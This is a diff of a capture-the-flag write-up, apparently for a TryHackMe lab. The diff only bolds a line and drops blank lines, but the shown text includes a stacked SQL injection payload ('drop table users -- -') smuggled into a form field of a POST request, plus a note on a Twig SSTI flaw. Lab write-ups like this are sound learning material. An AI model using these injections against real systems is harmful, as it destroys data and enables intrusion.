@@ -141,7 +141,7 @@ phpMyAdmin 4.9.5
 
 To get access to the admin panel for the challenge question, I need to delete the ‘users’ table. So I want to find somewhere to inject:
 
-drop table users -- -
+**drop table users -- -**
 
 So inject in dashboard
 
@@ -160,8 +160,6 @@ Cookie: PHPSESSID=04v8k348jddp0b0d76n46c16cu
 Upgrade-Insecure-Requests: 1
 
 rank=2&country=&gold=7; drop table users -- -&silver=0&bronze=7
-
-
 
 Found that first name item in http://injectics.thm/update_profile.php is SSTI vulneable with twig/twig	"2.14.0"
 
